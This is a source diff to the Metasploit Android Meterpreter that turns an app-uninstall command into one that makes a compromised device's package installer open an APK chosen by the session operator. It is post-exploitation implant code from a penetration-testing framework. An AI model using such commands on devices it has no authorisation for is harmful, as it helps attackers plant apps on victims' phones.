@@ -9,6 +9,7 @@ import android.net.Uri;
 import android.os.Bundle;
 
 import java.util.List;
+import java.io.File;
 
 import com.metasploit.meterpreter.AndroidMeterpreter;
 import com.metasploit.meterpreter.Meterpreter;
@@ -16,24 +17,29 @@ import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.TLVType;
 import com.metasploit.meterpreter.command.Command;
 
-public class android_app_uninstall implements Command {
+public class appapi_app_install implements Command {
     private static final int TLV_EXTENSIONS                = 20000;
-    private static final int TLV_TYPE_APP_PACKAGE_NAME     = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 2913);
+    private static final int TLV_TYPE_APP_APK_PATH         = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 2914);
+    private static final int TLV_TYPE_APP_INSTALL_ENUM     = TLVPacket.TLV_META_TYPE_UINT   | (TLV_EXTENSIONS + 2915);
     final Context context = AndroidMeterpreter.getContext();
 
     @Override
     public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
-        // AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
-        // final Context context = androidMeterpreter.getContext();
+        String apkpath = request.getStringValue(TLV_TYPE_APP_APK_PATH);
 
-        String PackageName = request.getStringValue(TLV_TYPE_APP_PACKAGE_NAME);
+        File file = new File(apkpath);
+        if(!file.exists())
+        {
+            response.addOverflow(TLV_TYPE_APP_INSTALL_ENUM, 2); // File Not Found
+            return ERROR_FAILURE;
+        }
 
-        Intent intent = new Intent(Intent.ACTION_DELETE);
-        intent.setData(Uri.parse("package:" + PackageName));
+        Intent intent = new Intent(Intent.ACTION_VIEW);
+        intent.setDataAndType(Uri.fromFile(new File(apkpath)), "application/vnd.android.package-archive");
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(intent);
 
-        // return ERROR_FAILURE;
+        response.addOverflow(TLV_TYPE_APP_INSTALL_ENUM, 1); // Good
         return ERROR_SUCCESS;
     }
 }
